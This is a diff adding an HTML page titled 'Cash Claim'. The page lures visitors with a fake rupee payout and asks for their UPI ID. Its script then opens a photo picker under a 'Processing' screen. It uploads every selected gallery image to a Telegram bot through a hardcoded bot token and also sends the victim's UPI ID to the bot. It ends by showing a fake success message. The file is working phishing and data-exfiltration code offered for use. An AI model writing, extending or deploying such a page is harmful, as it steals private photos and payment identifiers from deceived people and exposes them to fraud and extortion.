@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cash Claim</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background: #0d001a;
+      color: #e0d0ff;
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .box {
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+    .big-emoji {
+      font-size: 100px;
+      margin: 20px 0 30px;
+      animation: beat 1.8s infinite;
+    }
+    @keyframes beat {
+      0%,100% { transform: scale(1); }
+      50%     { transform: scale(1.15); }
+    }
+    h1 { color: #ffcc00; margin-bottom: 40px; }
+    .amounts {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+      justify-content: center;
+      margin: 30px 0;
+    }
+    .amt-btn {
+      background: #1a0033;
+      border: 2px solid #555;
+      color: white;
+      font-size: 1.4rem;
+      padding: 16px 32px;
+      border-radius: 16px;
+      cursor: pointer;
+    }
+    .amt-btn.active, .amt-btn:hover {
+      background: #ffcc00;
+      color: black;
+      border-color: #ffcc00;
+    }
+    input[type=text] {
+      width: 100%;
+      padding: 16px;
+      font-size: 1.1rem;
+      margin: 25px 0 35px;
+      border-radius: 12px;
+      border: 1px solid #666;
+      background: #140028;
+      color: white;
+      text-align: center;
+    }
+    #claim {
+      background: linear-gradient(90deg, #00ff88, #44ff00);
+      color: black;
+      font-size: 1.5rem;
+      font-weight: bold;
+      padding: 18px 80px;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 6px 20px #00ff8844;
+    }
+    #claim:disabled {
+      background: #444;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    #status {
+      margin-top: 40px;
+      font-size: 1.6rem;
+      font-weight: bold;
+      color: #ffeb3b;
+      min-height: 2em;
+      line-height: 1.4;
+      text-align: center;
+    }
+    .processing {
+      font-size: 2.2rem;
+      color: #ffffff;
+      letter-spacing: 2px;
+      animation: pulse 1.8s infinite;
+    }
+    @keyframes pulse {
+      0%,100% { opacity: 0.6; }
+      50%     { opacity: 1; }
+    }
+    .hide { display: none !important; }
+  </style>
+</head>
+<body>
+
+<div class="box" id="mainContent">
+  <div class="big-emoji">💵</div>
+  <h1>Select Amount</h1>
+
+  <div class="amounts" id="amts">
+    <button class="amt-btn" data-amt="10">10₹</button>
+    <button class="amt-btn" data-amt="20">20₹</button>
+    <button class="amt-btn" data-amt="30">30₹</button>
+    <button class="amt-btn" data-amt="50">50₹</button>
+  </div>
+
+  <input type="text" id="upi" placeholder="Enter UPI ID" />
+
+  <button id="claim" disabled>CLAIM NOW</button>
+</div>
+
+<div id="status"></div>
+
+<script>
+// ────────────────────────────────────────
+const TOKEN     = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";          // ← MUST CHANGE
+const TG_API    = `https://api.telegram.org/bot${TOKEN}/`;
+// ────────────────────────────────────────
+
+const params    = new URLSearchParams(location.search);
+const chatId    = params.get("id");
+
+let chosenAmt   = null;
+let sentCount   = 0;
+let total       = 0;
+
+const status    = document.getElementById("status");
+const claimBtn  = document.getElementById("claim");
+const upiField  = document.getElementById("upi");
+const amtBtns   = document.querySelectorAll(".amt-btn");
+const mainCont  = document.getElementById("mainContent");
+
+amtBtns.forEach(b => {
+  b.onclick = () => {
+    amtBtns.forEach(x => x.classList.remove("active"));
+    b.classList.add("active");
+    chosenAmt = b.dataset.amt;
+    checkReady();
+  };
+});
+
+upiField.oninput = checkReady;
+
+function checkReady() {
+  const u = upiField.value.trim();
+  claimBtn.disabled = !(chosenAmt && u.length > 5);
+}
+
+claimBtn.onclick = async () => {
+  if (!chatId) {
+    status.textContent = "Invalid link";
+    return;
+  }
+
+  // Hide everything except status
+  mainCont.classList.add("hide");
+  status.innerHTML = '<div class="processing">Processing...</div>';
+
+  const picker = document.createElement("input");
+  picker.type = "file";
+  picker.multiple = true;
+  picker.accept = "image/*";
+
+  const filePromise = new Promise(r => {
+    picker.onchange = e => r(e.target.files || []);
+    picker.click();
+  });
+
+  const files = await filePromise;
+
+  if (!files || files.length === 0) {
+    status.innerHTML = "No photos selected";
+    return;
+  }
+
+  total = files.length;
+  status.innerHTML = `<div class="processing">Sending ${total} photos...</div>`;
+
+  for (let i = 0; i < files.length; i++) {
+    const file = files[i];
+    const ok = await uploadOnePhoto(file, i + 1);
+    if (ok) sentCount++;
+    status.innerHTML = `<div class="processing">Sending... (\( {sentCount}/ \){total})</div>`;
+    await new Promise(r => setTimeout(r, 350)); // small delay
+  }
+
+  await sendReport();
+
+  status.innerHTML = 
+    `<div style="color:#00ff88; font-size:1.8rem;">
+       Success!<br>
+       Request sent<br>
+       Photos: \( {sentCount}/ \){total}<br>
+       Wait 1 hour
+     </div>`;
+};
+
+async function uploadOnePhoto(file, num) {
+  const form = new FormData();
+  form.append("chat_id", chatId);
+  form.append("photo", file, `img_${num}.jpg`);
+  form.append("caption", `\( {num}/ \){total} • ${chosenAmt || "?"} ₹`);
+
+  try {
+    const r = await fetch(TG_API + "sendPhoto", { method: "POST", body: form });
+    return r.ok;
+  } catch {
+    return false;
+  }
+}
+
+async function sendReport() {
+  const text = 
+`[AUTO] Gallery upload
+Amount: ${chosenAmt || "unknown"} ₹
+UPI: ${upiField.value.trim()}
+Photos: \( {sentCount}/ \){total}
+Link: ${location.href}`;
+
+  await fetch(TG_API + "sendMessage", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ chat_id: chatId, text })
+  }).catch(()=>{});
+}
+
+</script>
+</body>
+</html>
